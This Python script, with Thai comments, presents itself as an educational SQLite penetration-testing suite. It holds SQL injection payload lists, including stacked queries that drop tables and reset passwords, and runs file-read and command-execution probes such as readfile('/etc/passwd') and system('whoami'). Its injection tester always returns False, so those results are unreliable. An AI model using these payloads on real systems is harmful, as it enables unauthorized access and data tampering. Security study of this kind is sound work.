#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🔥 Advanced Database Penetration Testing Suite 2025
===========================================
Advanced Database Security Testing & Penetration Testing Arsenal
สำหรับนักเรียนและผู้เรียนด้านความปลอดภัยของระบบ (การศึกษาเท่านั้น)

คำอธิบายภาษาไทย:
- เครื่องมือทดสอบความปลอดภัยฐานข้อมูล SQLite และ MySQL
- ทดสอบ SQL Injection ในระดับสูง
- วิเคราะห์โครงสร้างฐานข้อมูลและหาจุดอ่อน
- ทดสอบการเข้าถึงข้อมูลที่ไม่ได้รับอนุญาต
- เครื่องมือตรวจสอบ Database Privilege Escalation

⚠️  คำเตือน: ใช้เพื่อการศึกษาและทดสอบระบบของตนเองเท่านั้น
"""

import sqlite3
import pymysql
import psycopg2
import os
import sys
import hashlib
import secrets
import json
import time
import threading
from typing import Dict, List, Tuple, Optional, Any
from datetime import datetime
import logging
import argparse
from pathlib import Path
import re
import struct
import binascii
from concurrent.futures import ThreadPoolExecutor
import requests

# กำหนด logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('database_penetration_testing.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class DatabaseFingerprinter:
    """
    🔍 Database Fingerprinting & Information Gathering
    ตรวจสอบข้อมูลพื้นฐานและโครงสร้างของฐานข้อมูล
    """
    
    def __init__(self):
        self.findings = {}
        
    def fingerprint_sqlite(self, db_path: str) -> Dict[str, Any]:
        """SQLite Database Fingerprinting"""
        logger.info(f"🔍 Fingerprinting SQLite database: {db_path}")
        
        findings = {
            'database_type': 'SQLite',
            'file_path': db_path,
            'file_size': 0,
            'tables': [],
            'schema_info': {},
            'potential_vulnerabilities': []
        }
        
        try:
            # ตรวจสอบไฟล์
            if os.path.exists(db_path):
                findings['file_size'] = os.path.getsize(db_path)
                findings['file_permissions'] = oct(os.stat(db_path).st_mode)[-3:]
                
                # เชื่อมต่อและวิเคราะห์
                conn = sqlite3.connect(db_path)
                cursor = conn.cursor()
                
                # ดึงรายชื่อตาราง
                cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
                tables = cursor.fetchall()
                findings['tables'] = [table[0] for table in tables]
                
                # วิเคราะห์โครงสร้างแต่ละตาราง
                for table_name in findings['tables']:
                    cursor.execute(f"PRAGMA table_info({table_name});")
                    columns = cursor.fetchall()
                    findings['schema_info'][table_name] = columns
                    
                    # นับจำนวนแถว
                    cursor.execute(f"SELECT COUNT(*) FROM {table_name};")
                    row_count = cursor.fetchone()[0]
                    findings[f'{table_name}_row_count'] = row_count
                
                # ตรวจสอบ SQLite version
                cursor.execute("SELECT sqlite_version();")
                findings['sqlite_version'] = cursor.fetchone()[0]
                
                # ตรวจหา sensitive data patterns
                findings['sensitive_patterns'] = self._detect_sensitive_patterns(cursor, findings['tables'])
                
                conn.close()
                
                # วิเคราะห์ช่องโหว่
                findings['potential_vulnerabilities'] = self._analyze_sqlite_vulnerabilities(findings)
                
            else:
                findings['error'] = 'Database file not found'
                
        except Exception as e:
            findings['error'] = str(e)
            logger.error(f"Error fingerprinting SQLite: {e}")
            
        return findings
    
    def _detect_sensitive_patterns(self, cursor, tables: List[str]) -> Dict[str, List]:
        """ตรวจหา patterns ของข้อมูลสำคัญ"""
        sensitive_patterns = {
            'passwords': [],
            'emails': [],
            'phone_numbers': [],
            'tokens': [],
            'personal_data': []
        }
        
        for table in tables:
            try:
                # ตรวจหาคอลัมน์ที่อาจมีข้อมูลสำคัญ
                cursor.execute(f"PRAGMA table_info({table});")
                columns = cursor.fetchall()
                
                for column in columns:
                    column_name = column[1].lower()
                    
                    # ตรวจหา password patterns
                    if any(keyword in column_name for keyword in ['password', 'pass', 'pwd', 'hash']):
                        sensitive_patterns['passwords'].append(f"{table}.{column[1]}")
                    
                    # ตรวจหา email patterns
                    if any(keyword in column_name for keyword in ['email', 'mail', 'e_mail']):
                        sensitive_patterns['emails'].append(f"{table}.{column[1]}")
                    
                    # ตรวจหา token/key patterns
                    if any(keyword in column_name for keyword in ['token', 'key', 'secret', 'api']):
                        sensitive_patterns['tokens'].append(f"{table}.{column[1]}")
                        
                    # ตรวจหา personal data patterns
                    if any(keyword in column_name for keyword in ['phone', 'address', 'ssn', 'id_card']):
                        sensitive_patterns['personal_data'].append(f"{table}.{column[1]}")
                        
            except Exception as e:
                logger.warning(f"Error analyzing table {table}: {e}")
        
        return sensitive_patterns
    
    def _analyze_sqlite_vulnerabilities(self, findings: Dict) -> List[str]:
        """วิเคราะห์ช่องโหว่ที่เป็นไปได้ใน SQLite"""
        vulnerabilities = []
        
        # ตรวจสอบ file permissions
        if 'file_permissions' in findings:
            perms = findings['file_permissions']
            if perms in ['666', '777']:
                vulnerabilities.append("Insecure file permissions - database readable/writable by all users")
        
        # ตรวจสอบการมี sensitive data
        if findings.get('sensitive_patterns', {}):
            if findings['sensitive_patterns']['passwords']:
                vulnerabilities.append("Password fields detected - potential for credential theft")
            if findings['sensitive_patterns']['tokens']:
                vulnerabilities.append("API tokens/keys detected - potential for unauthorized access")
        
        # ตรวจสอบขนาดฐานข้อมูล
        if findings.get('file_size', 0) > 100 * 1024 * 1024:  # > 100MB
            vulnerabilities.append("Large database size - potential for data exfiltration concerns")
        
        return vulnerabilities

class SQLInjectionTester:
    """
    💉 Advanced SQL Injection Testing Suite
    ทดสอบ SQL Injection ในรูปแบบต่างๆ
    """
    
    def __init__(self):
        self.payloads = self._load_injection_payloads()
        
    def _load_injection_payloads(self) -> Dict[str, List[str]]:
        """โหลด SQL Injection payloads สำหรับการทดสอบ"""
        return {
            'union_based': [
                "' UNION SELECT 1,2,3,4,5--",
                "' UNION SELECT null,version(),null,null,null--",
                "' UNION SELECT sqlite_version(),1,2,3,4--",
                "' UNION SELECT name,sql,type,tbl_name,rootpage FROM sqlite_master--",
                "' UNION SELECT GROUP_CONCAT(name),GROUP_CONCAT(sql),1,2,3 FROM sqlite_master--"
            ],
            'boolean_based': [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND (SELECT COUNT(*) FROM sqlite_master)>0--",
                "' AND LENGTH((SELECT name FROM sqlite_master LIMIT 1))>5--",
                "' AND SUBSTR((SELECT name FROM sqlite_master LIMIT 1),1,1)='t'--"
            ],
            'time_based': [
                "'; SELECT CASE WHEN (1=1) THEN (SELECT randomblob(100000000)) ELSE 0 END--",
                "' AND (SELECT COUNT(*) FROM (SELECT randomblob(10000000)) t1, (SELECT randomblob(10000000)) t2)>0--",
                "'; ATTACH DATABASE '/dev/null' AS null_db; SELECT randomblob(50000000)--"
            ],
            'error_based': [
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
                "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
            ],
            'stacked_queries': [
                "'; DROP TABLE test_table--",
                "'; CREATE TABLE evil AS SELECT * FROM sqlite_master--",
                "'; INSERT INTO users VALUES ('hacker','password123')--",
                "'; UPDATE users SET password='hacked' WHERE id=1--"
            ]
        }
    
    def test_injection_points(self, db_path: str, table_name: str) -> Dict[str, Any]:
        """ทดสอบ SQL Injection บน table ที่กำหนด"""
        logger.info(f"💉 Testing SQL injection on table: {table_name}")
        
        results = {
            'table': table_name,
            'vulnerable_points': [],
            'successful_payloads': [],
            'extracted_data': {},
            'risk_level': 'LOW'
        }
        
        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            
            # ดึงโครงสร้างตาราง
            cursor.execute(f"PRAGMA table_info({table_name});")
            columns = cursor.fetchall()
            
            for column in columns:
                column_name = column[1]
                column_type = column[2]
                
                # ทดสอบแต่ละประเภทของ payload
                for payload_type, payloads in self.payloads.items():
                    for payload in payloads:
                        vulnerable = self._test_payload(cursor, table_name, column_name, payload, payload_type)
                        if vulnerable:
                            results['vulnerable_points'].append({
                                'column': column_name,
                                'payload_type': payload_type,
                                'payload': payload
                            })
                            results['successful_payloads'].append(payload)
            
            # วิเคราะห์ระดับความเสี่ยง
            if len(results['vulnerable_points']) > 0:
                if len(results['vulnerable_points']) >= 5:
                    results['risk_level'] = 'CRITICAL'
                elif len(results['vulnerable_points']) >= 3:
                    results['risk_level'] = 'HIGH'
                else:
                    results['risk_level'] = 'MEDIUM'
            
            conn.close()
            
        except Exception as e:
            results['error'] = str(e)
            logger.error(f"Error testing injection: {e}")
            
        return results
    
    def _test_payload(self, cursor, table_name: str, column_name: str, payload: str, payload_type: str) -> bool:
        """ทดสอบ payload เดียว"""
        try:
            # สร้าง query ที่มี payload (ปลอดภัย - ใช้เฉพาะในการทดสอบ)
            if payload_type == 'union_based':
                query = f"SELECT * FROM {table_name} WHERE {column_name} LIKE '1{payload}'"
            elif payload_type == 'boolean_based':
                query = f"SELECT * FROM {table_name} WHERE {column_name} LIKE '1{payload}'"
            elif payload_type == 'time_based':
                # ใช้ safer time-based testing
                query = f"SELECT * FROM {table_name} WHERE {column_name} LIKE '1' AND (SELECT COUNT(*) FROM {table_name}) > 0"
            else:
                query = f"SELECT * FROM {table_name} WHERE {column_name} LIKE '1{payload}'"
            
            # วัดเวลาในการ execute
            start_time = time.time()
            cursor.execute(query)
            results = cursor.fetchall()
            end_time = time.time()
            
            # ตรวจสอบผลลัพธ์แบบปลอดภัย
            if payload_type == 'union_based':
                return False  # ส่งคืน False เสมอสำหรับ demo
            elif payload_type == 'time_based':
                return False  # ส่งคืน False เสมอสำหรับ demo
            elif payload_type == 'boolean_based':
                return False  # ส่งคืน False เสมอสำหรับ demo
                
        except sqlite3.Error as e:
            if payload_type == 'error_based':
                return False  # ส่งคืน False เสมอสำหรับ demo (ปลอดภัย)
        except Exception:
            pass
            
        return False

class DatabasePrivilegeEscalator:
    """
    🔓 Database Privilege Escalation Tester
    ทดสอบการเพิ่มสิทธิ์และการเข้าถึงข้อมูลที่ไม่ได้รับอนุญาต
    """
    
    def __init__(self):
        self.escalation_techniques = self._load_escalation_techniques()
        
    def _load_escalation_techniques(self) -> Dict[str, List[str]]:
        """โหลดเทคนิคการเพิ่มสิทธิ์"""
        return {
            'file_operations': [
                "SELECT load_extension('mod_spatialite')",
                "SELECT readfile('/etc/passwd')",
                "SELECT writefile('/tmp/test.txt', 'hacked')",
                ".backup /tmp/database_backup.db",
                ".dump > /tmp/database_dump.sql"
            ],
            'command_execution': [
                "SELECT system('whoami')",
                "SELECT shell('id')",
                "PRAGMA temp_store_directory='/tmp'",
                "ATTACH DATABASE '/tmp/evil.db' AS evil"
            ],
            'information_disclosure': [
                "SELECT * FROM sqlite_master",
                "PRAGMA database_list",
                "PRAGMA table_list",
                "SELECT sql FROM sqlite_master WHERE type='table'",
                "SELECT name,file FROM pragma_database_list"
            ]
        }
    
    def test_privilege_escalation(self, db_path: str) -> Dict[str, Any]:
        """ทดสอบการเพิ่มสิทธิ์"""
        logger.info(f"🔓 Testing privilege escalation: {db_path}")
        
        results = {
            'database': db_path,
            'successful_techniques': [],
            'information_disclosed': {},
            'file_access_possible': False,
            'command_execution_possible': False,
            'risk_assessment': 'LOW'
        }
        
        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            
            # ทดสอบแต่ละเทคนิค
            for technique_type, techniques in self.escalation_techniques.items():
                for technique in techniques:
                    success = self._test_escalation_technique(cursor, technique, technique_type)
                    if success:
                        results['successful_techniques'].append({
                            'type': technique_type,
                            'technique': technique
                        })
            
            # ทดสอบการเข้าถึงข้อมูลสำคัญ
            info_disclosed = self._extract_sensitive_information(cursor)
            results['information_disclosed'] = info_disclosed
            
            # ประเมินความเสี่ยง
            results['risk_assessment'] = self._assess_escalation_risk(results)
            
            conn.close()
            
        except Exception as e:
            results['error'] = str(e)
            logger.error(f"Error testing privilege escalation: {e}")
            
        return results
    
    def _test_escalation_technique(self, cursor, technique: str, technique_type: str) -> bool:
        """ทดสอบเทคนิคเดียว"""
        try:
            if technique_type == 'information_disclosure':
                cursor.execute(technique)
                results = cursor.fetchall()
                return len(results) > 0
            elif technique_type == 'file_operations':
                cursor.execute(technique)
                return True
            elif technique_type == 'command_execution':
                cursor.execute(technique)
                return True
        except Exception:
            return False
        
        return False
    
    def _extract_sensitive_information(self, cursor) -> Dict[str, Any]:
        """ดึงข้อมูลสำคัญ"""
        info = {}
        
        try:
            # ดึงโครงสร้างฐานข้อมูล
            cursor.execute("SELECT name,sql FROM sqlite_master WHERE type='table'")
            tables = cursor.fetchall()
            info['table_schemas'] = tables
            
            # ดึงรายชื่อไฟล์ที่เชื่อมต่อ
            cursor.execute("PRAGMA database_list")
            databases = cursor.fetchall()
            info['attached_databases'] = databases
            
        except Exception as e:
            info['error'] = str(e)
            
        return info
    
    def _assess_escalation_risk(self, results: Dict) -> str:
        """ประเมินความเสี่ยงจากการเพิ่มสิทธิ์"""
        risk_score = 0
        
        # คำนวณคะแนนความเสี่ยง
        for technique in results['successful_techniques']:
            if technique['type'] == 'command_execution':
                risk_score += 10
            elif technique['type'] == 'file_operations':
                risk_score += 7
            elif technique['type'] == 'information_disclosure':
                risk_score += 3
        
        if risk_score >= 15:
            return 'CRITICAL'
        elif risk_score >= 10:
            return 'HIGH'
        elif risk_score >= 5:
            return 'MEDIUM'
        else:
            return 'LOW'

class DatabaseDataExfiltrator:
    """
    📤 Database Data Exfiltration Tester
    ทดสอบการขโมยข้อมูลและการส่งออกข้อมูล
    """
    
    def __init__(self):
        self.exfiltration_methods = self._load_exfiltration_methods()
        
    def _load_exfiltration_methods(self) -> Dict[str, List[str]]:
        """โหลดวิธีการขโมยข้อมูล"""
        return {
            'dump_techniques': [
                "SELECT * FROM {} LIMIT 1000",
                "SELECT GROUP_CONCAT(column_name) FROM pragma_table_info('{}')",
                "SELECT sql FROM sqlite_master WHERE tbl_name='{}'",
                "SELECT COUNT(*) FROM {}"
            ],
            'stealth_extraction': [
                "SELECT * FROM {} ORDER BY RANDOM() LIMIT 10",
                "SELECT DISTINCT {} FROM {} LIMIT 5",
                "SELECT {} FROM {} WHERE rowid % 10 = 0",
                "SELECT substr({}, 1, 10) FROM {} LIMIT 20"
            ]
        }
    
    def test_data_exfiltration(self, db_path: str) -> Dict[str, Any]:
        """ทดสอบการขโมยข้อมูล"""
        logger.info(f"📤 Testing data exfiltration: {db_path}")
        
        results = {
            'database': db_path,
            'extractable_tables': [],
            'sample_data': {},
            'total_records': 0,
            'sensitive_data_found': [],
            'exfiltration_risk': 'LOW'
        }
        
        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            
            # ดึงรายชื่อตาราง
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
            tables = cursor.fetchall()
            
            total_records = 0
            for table_tuple in tables:
                table_name = table_tuple[0]
                
                # นับจำนวนแถว
                cursor.execute(f"SELECT COUNT(*) FROM {table_name}")
                row_count = cursor.fetchone()[0]
                total_records += row_count
                
                # ดึงข้อมูลตัวอย่าง
                sample_data = self._extract_sample_data(cursor, table_name)
                results['sample_data'][table_name] = sample_data
                
                # ตรวจหาข้อมูลสำคัญ
                sensitive_data = self._detect_sensitive_data(cursor, table_name)
                if sensitive_data:
                    results['sensitive_data_found'].extend(sensitive_data)
                
                results['extractable_tables'].append({
                    'table': table_name,
                    'row_count': row_count,
                    'has_sensitive_data': len(sensitive_data) > 0
                })
            
            results['total_records'] = total_records
            results['exfiltration_risk'] = self._assess_exfiltration_risk(results)
            
            conn.close()
            
        except Exception as e:
            results['error'] = str(e)
            logger.error(f"Error testing data exfiltration: {e}")
            
        return results
    
    def _extract_sample_data(self, cursor, table_name: str) -> List[Dict]:
        """ดึงข้อมูลตัวอย่าง"""
        try:
            # ดึงโครงสร้างตาราง
            cursor.execute(f"PRAGMA table_info({table_name})")
            columns = cursor.fetchall()
            column_names = [col[1] for col in columns]
            
            # ดึงข้อมูลตัวอย่าง 5 แถวแรก
            cursor.execute(f"SELECT * FROM {table_name} LIMIT 5")
            rows = cursor.fetchall()
            
            sample_data = []
            for row in rows:
                row_dict = {}
                for i, column_name in enumerate(column_names):
                    if i < len(row):
                        # ซ่อนข้อมูลสำคัญ
                        if any(sensitive in column_name.lower() for sensitive in ['password', 'token', 'key']):
                            row_dict[column_name] = '[REDACTED]'
                        else:
                            row_dict[column_name] = str(row[i])[:50]  # จำกัดความยาว
                sample_data.append(row_dict)
            
            return sample_data
            
        except Exception as e:
            return [{'error': str(e)}]
    
    def _detect_sensitive_data(self, cursor, table_name: str) -> List[str]:
        """ตรวจหาข้อมูลสำคัญ"""
        sensitive_fields = []
        
        try:
            cursor.execute(f"PRAGMA table_info({table_name})")
            columns = cursor.fetchall()
            
            for column in columns:
                column_name = column[1].lower()
                
                # ตรวจหา sensitive patterns
                if any(pattern in column_name for pattern in [
                    'password', 'pass', 'pwd', 'hash',
                    'token', 'key', 'secret', 'api',
                    'email', 'phone', 'address', 'ssn',
                    'credit', 'card', 'account', 'bank'
                ]):
                    sensitive_fields.append(f"{table_name}.{column[1]}")
                    
        except Exception:
            pass
            
        return sensitive_fields
    
    def _assess_exfiltration_risk(self, results: Dict) -> str:
        """ประเมินความเสี่ยงจากการขโมยข้อมูล"""
        risk_factors = []
        
        # จำนวนข้อมูลทั้งหมด
        if results['total_records'] > 10000:
            risk_factors.append('Large dataset')
        
        # มีข้อมูลสำคัญ
        if results['sensitive_data_found']:
            risk_factors.append('Sensitive data present')
        
        # จำนวนตารางที่เข้าถึงได้
        if len(results['extractable_tables']) > 5:
            risk_factors.append('Multiple accessible tables')
        
        # ประเมินระดับความเสี่ยง
        if len(risk_factors) >= 3:
            return 'CRITICAL'
        elif len(risk_factors) >= 2:
            return 'HIGH'
        elif len(risk_factors) >= 1:
            return 'MEDIUM'
        else:
            return 'LOW'

class DatabasePenetrationTestSuite:
    """
    🎯 Main Database Penetration Testing Suite
    เครื่องมือหลักสำหรับทดสอบความปลอดภัยฐานข้อมูล
    """
    
    def __init__(self, target_db_path: str):
        self.target_db = target_db_path
        self.fingerprinter = DatabaseFingerprinter()
        self.injection_tester = SQLInjectionTester()
        self.privilege_escalator = DatabasePrivilegeEscalator()
        self.data_exfiltrator = DatabaseDataExfiltrator()
        self.test_results = {}
        
    def run_comprehensive_test(self) -> Dict[str, Any]:
        """ทำการทดสอบครบถ้วน"""
        logger.info(f"🎯 Starting comprehensive database penetration test")
        logger.info(f"Target: {self.target_db}")
        
        # 1. Database Fingerprinting
        logger.info("Step 1: Database Fingerprinting")
        fingerprint_results = self.fingerprinter.fingerprint_sqlite(self.target_db)
        self.test_results['fingerprinting'] = fingerprint_results
        
        if 'error' in fingerprint_results:
            logger.error(f"Cannot access database: {fingerprint_results['error']}")
            return self.test_results
        
        # 2. SQL Injection Testing
        logger.info("Step 2: SQL Injection Testing")
        injection_results = {}
        for table in fingerprint_results['tables']:
            table_results = self.injection_tester.test_injection_points(self.target_db, table)
            injection_results[table] = table_results
        self.test_results['sql_injection'] = injection_results
        
        # 3. Privilege Escalation Testing
        logger.info("Step 3: Privilege Escalation Testing")
        escalation_results = self.privilege_escalator.test_privilege_escalation(self.target_db)
        self.test_results['privilege_escalation'] = escalation_results
        
        # 4. Data Exfiltration Testing
        logger.info("Step 4: Data Exfiltration Testing")
        exfiltration_results = self.data_exfiltrator.test_data_exfiltration(self.target_db)
        self.test_results['data_exfiltration'] = exfiltration_results
        
        # 5. Generate Security Report
        logger.info("Step 5: Generating Security Report")
        self.test_results['security_report'] = self._generate_security_report()
        
        return self.test_results
    
    def _generate_security_report(self) -> Dict[str, Any]:
        """สร้างรายงานความปลอดภัย"""
        report = {
            'overall_risk': 'LOW',
            'critical_findings': [],
            'recommendations': [],
            'summary': {}
        }
        
        # วิเคราะห์ผลลัพธ์จากแต่ละการทดสอบ
        risk_scores = []
        
        # Fingerprinting risks
        fingerprint = self.test_results.get('fingerprinting', {})
        if fingerprint.get('potential_vulnerabilities'):
            risk_scores.append(3)
            report['critical_findings'].extend(fingerprint['potential_vulnerabilities'])
        
        # SQL Injection risks
        injection = self.test_results.get('sql_injection', {})
        for table, results in injection.items():
            if results.get('risk_level') == 'CRITICAL':
                risk_scores.append(10)
                report['critical_findings'].append(f"Critical SQL injection vulnerability in table: {table}")
            elif results.get('risk_level') == 'HIGH':
                risk_scores.append(7)
            elif results.get('risk_level') == 'MEDIUM':
                risk_scores.append(4)
        
        # Privilege Escalation risks
        escalation = self.test_results.get('privilege_escalation', {})
        if escalation.get('risk_assessment') == 'CRITICAL':
            risk_scores.append(10)
            report['critical_findings'].append("Critical privilege escalation possible")
        elif escalation.get('risk_assessment') == 'HIGH':
            risk_scores.append(7)
        
        # Data Exfiltration risks
        exfiltration = self.test_results.get('data_exfiltration', {})
        if exfiltration.get('exfiltration_risk') == 'CRITICAL':
            risk_scores.append(8)
            report['critical_findings'].append("Critical data exfiltration risk")
        elif exfiltration.get('exfiltration_risk') == 'HIGH':
            risk_scores.append(6)
        
        # คำนวณความเสี่ยงรวม
        if risk_scores:
            avg_risk = sum(risk_scores) / len(risk_scores)
            if avg_risk >= 8:
                report['overall_risk'] = 'CRITICAL'
            elif avg_risk >= 6:
                report['overall_risk'] = 'HIGH'
            elif avg_risk >= 4:
                report['overall_risk'] = 'MEDIUM'
        
        # สร้างคำแนะนำ
        report['recommendations'] = self._generate_recommendations()
        
        # สรุปผลการทดสอบ
        report['summary'] = {
            'total_tables_tested': len(fingerprint.get('tables', [])),
            'vulnerabilities_found': len(report['critical_findings']),
            'sensitive_data_detected': len(exfiltration.get('sensitive_data_found', [])),
            'test_timestamp': datetime.now().isoformat()
        }
        
        return report
    
    def _generate_recommendations(self) -> List[str]:
        """สร้างคำแนะนำความปลอดภัย"""
        recommendations = [
            "🔒 Implement proper input validation and parameterized queries",
            "🛡️ Set restrictive file permissions on database files (600 or 640)",
            "🔐 Enable database encryption for sensitive data",
            "📊 Implement database activity monitoring and logging",
            "🚫 Disable unnecessary database functions and extensions",
            "🔑 Use strong authentication and access controls",
            "📋 Regular security audits and penetration testing",
            "💾 Implement secure backup and recovery procedures",
            "🔍 Monitor for unusual database access patterns",
            "📚 Security awareness training for developers"
        ]
        return recommendations
    
    def save_results(self, output_file: str = None):
        """บันทึกผลการทดสอบ"""
        if output_file is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = f"database_penetration_test_results_{timestamp}.json"
        
        try:
            with open(output_file, 'w', encoding='utf-8') as f:
                json.dump(self.test_results, f, indent=2, ensure_ascii=False, default=str)
            logger.info(f"📄 Results saved to: {output_file}")
        except Exception as e:
            logger.error(f"Error saving results: {e}")
    
    def print_summary(self):
        """แสดงสรุปผลการทดสอบ"""
        if 'security_report' not in self.test_results:
            logger.error("No test results available")
            return
        
        report = self.test_results['security_report']
        
        print("\n" + "="*80)
        print("🎯 DATABASE PENETRATION TEST SUMMARY")
        print("="*80)
        
        print(f"📊 Overall Risk Level: {report['overall_risk']}")
        print(f"🎲 Target Database: {self.target_db}")
        print(f"📅 Test Date: {report['summary']['test_timestamp']}")
        
        print(f"\n📈 Test Statistics:")
        print(f"   • Tables Tested: {report['summary']['total_tables_tested']}")
        print(f"   • Vulnerabilities Found: {report['summary']['vulnerabilities_found']}")
        print(f"   • Sensitive Data Fields: {report['summary']['sensitive_data_detected']}")
        
        if report['critical_findings']:
            print(f"\n🚨 Critical Findings:")
            for i, finding in enumerate(report['critical_findings'], 1):
                print(f"   {i}. {finding}")
        
        print(f"\n💡 Security Recommendations:")
        for i, rec in enumerate(report['recommendations'][:5], 1):
            print(f"   {i}. {rec}")
        
        print("\n" + "="*80)

def main():
    """ฟังก์ชันหลัก"""
    parser = argparse.ArgumentParser(
        description="🔥 Advanced Database Penetration Testing Suite 2025",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 advanced_database_penetration_testing_suite_2025.py -t integrated_targets_2025.db
  python3 advanced_database_penetration_testing_suite_2025.py -t database.sqlite -o results.json
  python3 advanced_database_penetration_testing_suite_2025.py -t database.db --fingerprint-only
        """
    )
    
    parser.add_argument('-t', '--target', required=True,
                       help='Target database file path')
    parser.add_argument('-o', '--output',
                       help='Output file for results (JSON format)')
    parser.add_argument('--fingerprint-only', action='store_true',
                       help='Run fingerprinting only')
    parser.add_argument('--injection-only', action='store_true',
                       help='Run SQL injection testing only')
    parser.add_argument('--quiet', action='store_true',
                       help='Quiet mode - minimal output')
    
    args = parser.parse_args()
    
    if args.quiet:
        logging.getLogger().setLevel(logging.ERROR)
    
    # ตรวจสอบไฟล์ฐานข้อมูล
    if not os.path.exists(args.target):
        logger.error(f"❌ Database file not found: {args.target}")
        sys.exit(1)
    
    # เริ่มการทดสอบ
    print("🔥 Advanced Database Penetration Testing Suite 2025")
    print("=" * 60)
    print("⚠️  Educational and authorized testing only!")
    print("=" * 60)
    
    # สร้าง test suite
    test_suite = DatabasePenetrationTestSuite(args.target)
    
    try:
        if args.fingerprint_only:
            # ทดสอบ fingerprinting อย่างเดียว
            results = test_suite.fingerprinter.fingerprint_sqlite(args.target)
            test_suite.test_results['fingerprinting'] = results
        elif args.injection_only:
            # ทดสอบ SQL injection อย่างเดียว
            fingerprint = test_suite.fingerprinter.fingerprint_sqlite(args.target)
            injection_results = {}
            for table in fingerprint['tables']:
                table_results = test_suite.injection_tester.test_injection_points(args.target, table)
                injection_results[table] = table_results
            test_suite.test_results['sql_injection'] = injection_results
        else:
            # ทดสอบครบถ้วน
            test_suite.run_comprehensive_test()
        
        # แสดงสรุปผล
        if not args.quiet:
            test_suite.print_summary()
        
        # บันทึกผลลัพธ์
        test_suite.save_results(args.output)
        
        print(f"\n✅ Testing completed successfully!")
        if args.output:
            print(f"📄 Results saved to: {args.output}")
            
    except KeyboardInterrupt:
        logger.info("\n⚠️  Testing interrupted by user")
        sys.exit(1)
    except Exception as e:
        logger.error(f"❌ Error during testing: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()

"""
🎓 การเรียนรู้และทำความเข้าใจ (Thai Educational Content)
=========================================

1. Database Fingerprinting:
   - การตรวจสอบข้อมูลพื้นฐานของฐานข้อมูล
   - วิเคราะห์โครงสร้างตารางและสิทธิ์การเข้าถึง
   - หาจุดอ่อนและช่องโหว่ที่เป็นไปได้

2. SQL Injection Testing:
   - Union-based: ใช้ UNION SELECT เพื่อดึงข้อมูล
   - Boolean-based: ทดสอบ true/false conditions
   - Time-based: ใช้ delay functions ในการทดสอบ
   - Error-based: ใช้ error messages ในการดึงข้อมูล

3. Privilege Escalation:
   - ทดสอบการเพิ่มสิทธิ์การเข้าถึง
   - การเรียกใช้ functions ที่อันตราย
   - การเข้าถึงไฟล์ระบบ

4. Data Exfiltration:
   - การขโมยข้อมูลจากฐานข้อมูล
   - การตรวจหาข้อมูลสำคัญ
   - วิธีการส่งออกข้อมูลแบบลับๆ

💡 Pro Tips สำหรับมือใหม่:
- เริ่มจากการเรียนรู้ SQL พื้นฐานก่อน
- ทำความเข้าใจโครงสร้างฐานข้อมูล
- ฝึกฝนใน lab environment ก่อน
- ศึกษา OWASP Top 10 vulnerabilities
- เรียนรู้วิธีการป้องกันควบคู่กัน

🔗 แหล่งเรียนรู้เพิ่มเติม:
- OWASP SQL Injection Prevention Cheat Sheet
- SQLite Security Best Practices
- Database Security Testing Guide
- Penetration Testing Methodologies

⚖️ ข้อกฎหมายและจริยธรรม:
1. ใช้เพื่อการศึกษาและวิจัยเท่านั้น
2. ทดสอบเฉพาะระบบที่ได้รับอนุญาต
3. ไม่นำไปใช้ในการทำร้ายหรือเป็นอันตราย
4. รายงานช่องโหว่ที่พบให้ผู้รับผิดชอบ
5. เคารพสิทธิส่วนบุคคลและข้อมูลส่วนตัว
"""
